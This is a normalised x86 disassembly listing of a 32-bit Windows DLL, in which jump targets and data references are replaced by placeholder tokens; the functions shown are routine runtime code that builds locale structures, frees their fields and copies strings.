mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_10028b8d
retn
sub_1002d920
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_100332c8
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_100332c8
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_1002d97e
push 0x10
push r--data
call sub_10028b48
xor eax eax
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp ebx edi
setne al
cmp eax edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_10026065
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_10020579
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
push [ rw-data ]
call [ HeapSize@IAT ]
mov esi eax
push 0x4
call sub_10028f4e
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_10028f81
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
call sub_10028b8d
retn
mov esi [ ebp - 0x1c ]
mov esi [ ebx - 0x4 ]
sub esi 0x9
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov eax esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002da18
cmp [ ebp - 0x20 ] edi
jne r-xdata
sub_1002da21
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
movzx ecx [ eax + 0x42 ]
movzx edx [ eax + 0x44 ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
test esi esi
jne r-xdata
and [ ebp - 0xc ] 0x0
push ebx
push edi
mov [ ebp - 0x10 ] eax
lea eax [ esi + 0x4 ]
push eax
push 0x31
push ecx
xor ebx ebx
inc ebx
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
mov edi eax
lea eax [ esi + 0x8 ]
push eax
push 0x32
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
or edi eax
lea eax [ esi + 0xc ]
push eax
push 0x33
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
or edi eax
lea eax [ esi + 0x10 ]
push eax
push 0x34
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
add esp 0x50
or edi eax
lea eax [ esi + 0x14 ]
push eax
push 0x35
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
or edi eax
lea eax [ esi + 0x18 ]
push eax
push 0x36
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
push esi
push 0x37
push [ ebp - 0x4 ]
or edi eax
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
or edi eax
lea eax [ esi + 0x20 ]
push eax
push 0x2a
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
add esp 0x50
or edi eax
lea eax [ esi + 0x24 ]
push eax
push 0x2b
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
or edi eax
lea eax [ esi + 0x28 ]
push eax
push 0x2c
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
or edi eax
lea eax [ esi + 0x2c ]
push eax
push 0x2d
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
or edi eax
lea eax [ esi + 0x30 ]
push eax
push 0x2e
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
add esp 0x50
or edi eax
lea eax [ esi + 0x34 ]
push eax
push 0x2f
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
or edi eax
lea eax [ esi + 0x1c ]
push eax
push 0x30
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
or edi eax
lea eax [ esi + 0x38 ]
push eax
push 0x44
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
or edi eax
lea eax [ esi + 0x3c ]
push eax
push 0x45
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
add esp 0x50
or edi eax
lea eax [ esi + 0x40 ]
push eax
push 0x46
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
or edi eax
lea eax [ esi + 0x44 ]
push eax
push 0x47
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
or edi eax
lea eax [ esi + 0x48 ]
push eax
push 0x48
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
or edi eax
lea eax [ esi + 0x4c ]
push eax
push 0x49
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
add esp 0x50
or edi eax
lea eax [ esi + 0x50 ]
push eax
push 0x4a
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
or edi eax
lea eax [ esi + 0x54 ]
push eax
push 0x4b
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
or edi eax
lea eax [ esi + 0x58 ]
push eax
push 0x4c
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
or edi eax
lea eax [ esi + 0x5c ]
push eax
push 0x4d
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
add esp 0x50
or edi eax
lea eax [ esi + 0x60 ]
push eax
push 0x4e
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
or edi eax
lea eax [ esi + 0x64 ]
push eax
push 0x4f
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
or edi eax
lea eax [ esi + 0x68 ]
push eax
push 0x38
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
or edi eax
lea eax [ esi + 0x6c ]
push eax
push 0x39
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
add esp 0x50
or edi eax
lea eax [ esi + 0x70 ]
push eax
push 0x3a
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
or edi eax
lea eax [ esi + 0x74 ]
push eax
push 0x3b
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
or edi eax
lea eax [ esi + 0x78 ]
push eax
push 0x3c
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
or edi eax
lea eax [ esi + 0x7c ]
push eax
push 0x3d
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
add esp 0x50
or edi eax
lea eax [ esi + 0x80 ]
push eax
push 0x3e
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
or edi eax
lea eax [ esi + 0x84 ]
push eax
push 0x3f
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
or edi eax
lea eax [ esi + 0x88 ]
push eax
push 0x40
push [ ebp - 0x4 ]
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_1002acc4
or edi eax
lea eax [ esi + 0x8c ]
push eax
push 0x41
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
add esp 0x50
or edi eax
lea eax [ esi + 0x90 ]
push eax
push 0x42
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
or edi eax
lea eax [ esi + 0x94 ]
push eax
push 0x43
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
or edi eax
lea eax [ esi + 0x98 ]
push eax
push 0x28
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
or edi eax
lea eax [ esi + 0x9c ]
push eax
push 0x29
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
add esp 0x50
or edi eax
lea eax [ esi + 0xa0 ]
push eax
push 0x1f
push [ ebp - 0x8 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
or edi eax
lea eax [ esi + 0xa4 ]
push eax
push 0x20
push [ ebp - 0x8 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
or edi eax
lea eax [ esi + 0xa8 ]
push eax
push 0x1003
push [ ebp - 0x8 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002acc4
or edi eax
lea eax [ esi + 0xb0 ]
push eax
push 0x1009
mov ebx [ ebp - 0x8 ]
push ebx
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1002acc4
add esp 0x50
or edi eax
mov eax edi
pop edi
mov [ esi + 0xac ] ebx
pop ebx
leave
retn
or eax 0xffffffff
leave
retn
sub_1002de3c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_100207fd
push [ esi + 0x8 ]
call sub_100207fd
push [ esi + 0xc ]
call sub_100207fd
push [ esi + 0x10 ]
call sub_100207fd
push [ esi + 0x14 ]
call sub_100207fd
push [ esi + 0x18 ]
call sub_100207fd
push [ esi ]
call sub_100207fd
push [ esi + 0x20 ]
call sub_100207fd
push [ esi + 0x24 ]
call sub_100207fd
push [ esi + 0x28 ]
call sub_100207fd
push [ esi + 0x2c ]
call sub_100207fd
push [ esi + 0x30 ]
call sub_100207fd
push [ esi + 0x34 ]
call sub_100207fd
push [ esi + 0x1c ]
call sub_100207fd
push [ esi + 0x38 ]
call sub_100207fd
push [ esi + 0x3c ]
call sub_100207fd
add esp 0x40
push [ esi + 0x40 ]
call sub_100207fd
push [ esi + 0x44 ]
call sub_100207fd
push [ esi + 0x48 ]
call sub_100207fd
push [ esi + 0x4c ]
call sub_100207fd
push [ esi + 0x50 ]
call sub_100207fd
push [ esi + 0x54 ]
call sub_100207fd
push [ esi + 0x58 ]
call sub_100207fd
push [ esi + 0x5c ]
call sub_100207fd
push [ esi + 0x60 ]
call sub_100207fd
push [ esi + 0x64 ]
call sub_100207fd
push [ esi + 0x68 ]
call sub_100207fd
push [ esi + 0x6c ]
call sub_100207fd
push [ esi + 0x70 ]
call sub_100207fd
push [ esi + 0x74 ]
call sub_100207fd
push [ esi + 0x78 ]
call sub_100207fd
push [ esi + 0x7c ]
call sub_100207fd
add esp 0x40
push [ esi + 0x80 ]
call sub_100207fd
push [ esi + 0x84 ]
call sub_100207fd
push [ esi + 0x88 ]
call sub_100207fd
push [ esi + 0x8c ]
call sub_100207fd
push [ esi + 0x90 ]
call sub_100207fd
push [ esi + 0x94 ]
call sub_100207fd
push [ esi + 0x98 ]
call sub_100207fd
push [ esi + 0x9c ]
call sub_100207fd
push [ esi + 0xa0 ]
call sub_100207fd
push [ esi + 0xa4 ]
call sub_100207fd
push [ esi + 0xa8 ]
call sub_100207fd
add esp 0x2c
sub_1002dfd1
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x20 ] 0x0
mov ebx rw-data
je r-xdata
mov esi ebx
push 0xb8
push 0x1
call sub_10026cea
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
mov [ edi ] esi
xor eax eax
add eax 0xb4
push eax
call [ InterlockedDecrement@IAT ]
mov eax edi
call sub_1002da21
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ esi + 0xb4 ] 0x1
jmp r-xdata
push esi
call sub_1002de3c
push esi
call sub_100207fd
pop ecx
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
add edi 0xd4
mov eax [ edi ]
cmp eax ebx
je r-xdata
sub_1002e04a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100207fd
pop ecx
mov esi [ esi + 0x8 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_100207fd
pop ecx
push esi
call sub_100207fd
pop ecx
sub_1002e08f
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor esi esi
push edi
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] esi
cmp [ ebx + 0x1c ] esi
jne r-xdata
push 0x30
push 0x1
call sub_10026cea
mov edi eax
pop ecx
pop ecx
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
cmp [ ebx + 0x18 ] esi
jne r-xdata
mov esi [ ebx + 0xbc ]
push 0xc
pop ecx
push 0x4
[ edi ] [ esi ]
call sub_10026ca5
xor esi esi
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax esi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] esi
mov [ ebp + 0x8 ] rw-data
jmp r-xdata
mov [ eax ] esi
cmp [ ebx + 0x1c ] esi
je r-xdata
push [ ebp + 0x8 ]
call sub_100207fd
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebx + 0xb4 ]
mov esi [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ rw-data ]
mov [ eax + 0x4 ] ecx
mov ecx [ rw-data ]
mov [ ebp - 0x4 ] esi
mov [ eax + 0x8 ] ecx
push 0x4
call sub_10026ca5
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
jne r-xdata
mov eax [ ebx + 0xb0 ]
test eax eax
je r-xdata
push eax
call esi
mov [ eax ] ecx
mov [ eax ] esi
mov esi [ ebp + 0x8 ]
movzx edi [ ebx + 0x3e ]
push esi
push 0xe
push edi
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_1002acc4
mov [ ebp - 0xc ] eax
lea eax [ esi + 0x4 ]
push eax
push 0xf
push edi
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_1002acc4
or [ ebp - 0xc ] eax
lea eax [ esi + 0x8 ]
push eax
push 0x10
push edi
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_1002acc4
add esp 0x3c
or eax [ ebp - 0xc ]
je r-xdata
xor esi esi
inc esi
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xb4 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0xbc ] eax
xor eax eax
push eax
call esi
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
jmp r-xdata
push esi
call sub_1002e04a
pop ecx
or esi 0xffffffff
jmp r-xdata
push [ ebx + 0xb0 ]
call sub_100207fd
push [ ebx + 0xbc ]
call sub_100207fd
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
call sub_100207fd
push [ ebp - 0x8 ]
call sub_100207fd
pop ecx
pop ecx
mov eax esi
jmp r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov eax [ ebp - 0x8 ]
xor ecx ecx
inc ecx
mov [ eax ] ecx
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
lea edi [ esi + 0x1 ]
mov cl [ edi ]
mov [ esi ] cl
mov esi edi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_1002e259
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100207fd
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100207fd
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100207fd
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100207fd
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100207fd
pop ecx
mov esi [ esi + 0x24 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_100207fd
pop ecx
push esi
call sub_100207fd
pop ecx
sub_1002e2e7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] edi
cmp [ esi + 0x18 ] edi
jne r-xdata
push 0x30
push 0x1
call sub_10026cea
mov ebx eax
pop ecx
pop ecx
cmp ebx edi
jne r-xdata
cmp [ esi + 0x1c ] edi
jne r-xdata
push 0x4
call sub_10026ca5
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
mov ebx rw-data
jmp r-xdata
mov [ eax ] edi
cmp [ esi + 0x18 ] edi
je r-xdata
push ebx
call sub_100207fd
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi + 0xb8 ]
cmp eax edi
je r-xdata
push 0xc
pop ecx
mov esi rw-data
mov edi ebx
[ edi ] [ esi ]
push 0x4
call sub_10026ca5
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax edi
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax edi
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
mov [ eax ] edi
movzx esi [ esi + 0x38 ]
lea eax [ ebx + 0xc ]
push eax
push 0x15
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1002acc4
mov edi eax
lea eax [ ebx + 0x10 ]
push eax
push 0x14
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1002acc4
or edi eax
lea eax [ ebx + 0x14 ]
push eax
push 0x16
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1002acc4
or edi eax
lea eax [ ebx + 0x18 ]
push eax
push 0x17
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1002acc4
add esp 0x50
or edi eax
lea eax [ ebx + 0x1c ]
push eax
push 0x18
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1002acc4
or edi eax
lea eax [ ebx + 0x20 ]
push eax
push 0x50
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1002acc4
or edi eax
lea eax [ ebx + 0x24 ]
push eax
push 0x51
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1002acc4
or edi eax
lea eax [ ebx + 0x28 ]
push eax
push 0x1a
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1002acc4
add esp 0x50
or edi eax
lea eax [ ebx + 0x29 ]
push eax
push 0x19
push esi
push 0x0
lea eax [ ebp - 0x10 ]
push eax
call sub_1002acc4
or edi eax
lea eax [ ebx + 0x2a ]
push eax
push 0x54
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1002acc4
or edi eax
lea eax [ ebx + 0x2b ]
push eax
push 0x55
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1002acc4
or edi eax
lea eax [ ebx + 0x2c ]
push eax
push 0x56
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1002acc4
add esp 0x50
or edi eax
lea eax [ ebx + 0x2d ]
push eax
push 0x57
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1002acc4
or edi eax
lea eax [ ebx + 0x2e ]
push eax
push 0x52
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1002acc4
or edi eax
lea eax [ ebx + 0x2f ]
push eax
push 0x53
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1002acc4
add esp 0x3c
or eax edi
je r-xdata
push ebx
call sub_100207fd
push [ ebp - 0x8 ]
call sub_100207fd
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0xb8 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi + 0xb0 ] eax
mov [ esi + 0xbc ] ebx
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
push ebx
call sub_1002e259
push ebx
call sub_100207fd
push [ ebp - 0x8 ]
call sub_100207fd
push [ ebp - 0x4 ]
call sub_100207fd
add esp 0x10
jmp r-xdata
pop ecx
jmp r-xdata
push [ esi + 0xbc ]
call sub_100207fd
push [ esi + 0xb0 ]
call sub_100207fd
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x8 ]
add eax 0xbc
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebx ] ecx
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov [ ebx + 0x4 ] ecx
mov eax [ eax ]
mov eax [ eax + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov [ ebx + 0x8 ] eax
xor eax eax
inc eax
xor edi edi
mov [ ecx ] eax
cmp [ ebp - 0x4 ] edi
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
lea edi [ esi + 0x1 ]
mov cl [ edi ]
mov [ esi ] cl
mov esi edi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_1002e5ad
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x18 ]
xor ebx ebx
call sub_10023358
mov eax [ ebp - 0x18 ]
mov edi [ eax + 0xd4 ]
mov [ ebp - 0x4 ] ebx
mov esi [ ebp - 0x4 ]
shl esi 0x2
push [ esi + edi + 0x1c ]
call sub_100200e0
push [ esi + edi ]
mov [ ebp - 0x8 ] eax
call sub_100200e0
add eax ebx
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x7
pop ecx
pop ecx
mov ecx [ ebp - 0x8 ]
lea ebx [ eax + ecx + 0x2 ]
jb r-xdata
lea eax [ ebx + 0x1 ]
push eax
call sub_10026ca5
mov esi eax
pop ecx
mov [ ebp - 0x8 ] esi
test esi esi
je r-xdata
cmp [ ebp - 0xc ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x8 ]
leave
retn
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
call sub_100200e0
add esi eax
mov eax [ ebp - 0x4 ]
mov [ esi ] 0x3a
push [ edi + eax * 4 + 0x1c ]
mov eax [ ebp - 0x8 ]
inc esi
sub eax esi
lea eax [ eax + ebx + 0x1 ]
push eax
push esi
call sub_1002776c
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10020451
add esp 0x14
push esi
call sub_100200e0
add esi eax
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x7
pop ecx
jb r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10020451
add esp 0x14
mov eax [ ebp - 0x4 ]
mov [ esi ] 0x3a
push [ edi + eax * 4 ]
mov eax [ ebp - 0x8 ]
inc esi
sub eax esi
lea eax [ eax + ebx + 0x1 ]
push eax
push esi
call sub_1002776c
add esp 0xc
test eax eax
je r-xdata
mov [ esi ] 0x0
sub_1002e6b6
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
xor ebx ebx
call sub_10023358
mov eax [ ebp - 0x1c ]
mov edi [ eax + 0xd4 ]
lea esi [ edi + 0x38 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] 0xc
push [ esi + 0x30 ]
call sub_100200e0
push [ esi ]
mov [ ebp - 0xc ] eax
call sub_100200e0
mov esi [ ebp - 0x4 ]
pop ecx
pop ecx
mov ecx [ ebp - 0xc ]
add eax ebx
add esi 0x4
dec [ ebp - 0x8 ]
lea ebx [ eax + ecx + 0x2 ]
mov [ ebp - 0x4 ] esi
jne r-xdata
lea eax [ ebx + 0x1 ]
push eax
call sub_10026ca5
mov esi eax
pop ecx
mov [ ebp - 0x4 ] esi
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
add edi 0x68
mov [ ebp - 0x8 ] 0xc
mov eax [ ebp - 0x4 ]
leave
retn
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
call sub_100200e0
add esi eax
mov eax [ ebp - 0x4 ]
mov [ esi ] 0x3a
push [ edi ]
inc esi
sub eax esi
lea eax [ eax + ebx + 0x1 ]
push eax
push esi
call sub_1002776c
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10020451
add esp 0x14
push esi
call sub_100200e0
add esi eax
add edi 0x4
dec [ ebp - 0x8 ]
pop ecx
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10020451
add esp 0x14
mov eax [ ebp - 0x4 ]
mov [ esi ] 0x3a
push [ edi - 0x30 ]
inc esi
sub eax esi
lea eax [ eax + ebx + 0x1 ]
push eax
push esi
call sub_1002776c
add esp 0xc
test eax eax
je r-xdata
mov [ esi ] 0x0
sub_1002e7bf
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x24 ]
xor edi edi
call sub_10023358
mov eax [ ebp - 0x24 ]
mov esi [ eax + 0xd4 ]
mov [ ebp - 0x4 ] edi
mov ebx [ ebp - 0x4 ]
shl ebx 0x2
push [ ebx + esi + 0x1c ]
call sub_100200e0
push [ ebx + esi ]
mov [ ebp - 0x14 ] eax
call sub_100200e0
add eax edi
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x7
pop ecx
pop ecx
mov ecx [ ebp - 0x14 ]
lea edi [ eax + ecx + 0x2 ]
jb r-xdata
lea eax [ esi + 0x38 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xc
mov ebx [ ebp - 0x10 ]
push [ ebx + 0x30 ]
call sub_100200e0
push [ ebx ]
mov [ ebp - 0x14 ] eax
call sub_100200e0
add [ ebp - 0x10 ] 0x4
pop ecx
pop ecx
mov ecx [ ebp - 0x14 ]
add eax edi
dec [ ebp - 0xc ]
lea edi [ eax + ecx + 0x2 ]
jne r-xdata
push [ esi + 0x9c ]
call sub_100200e0
push [ esi + 0x98 ]
mov ebx eax
call sub_100200e0
push [ esi + 0xa0 ]
add eax edi
lea edi [ eax + ebx + 0x2 ]
call sub_100200e0
push [ esi + 0xa4 ]
lea edi [ edi + eax + 0x1 ]
call sub_100200e0
push [ esi + 0xa8 ]
lea edi [ edi + eax + 0x1 ]
call sub_100200e0
lea eax [ edi + eax + 0xb9 ]
push eax
mov [ ebp - 0x8 ] eax
call sub_10026ca5
mov ebx eax
add esp 0x18
test ebx ebx
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0xb8
push esi
push ebx
lea edi [ ebx + 0xb8 ]
call sub_10026940
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x1c ]
mov [ ebp - 0x10 ] ebx
add esp 0xc
sub [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] eax
pop edi
pop esi
mov eax ebx
pop ebx
leave
retn
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
push edi
call sub_100200e0
mov ecx [ ebp - 0x10 ]
lea edi [ edi + eax + 0x1 ]
mov eax [ ebp - 0xc ]
mov [ ecx + eax ] edi
push [ eax ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
push eax
push edi
call sub_1002776c
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10020451
add esp 0x14
push edi
call sub_100200e0
inc [ ebp - 0x4 ]
add [ ebp - 0xc ] 0x4
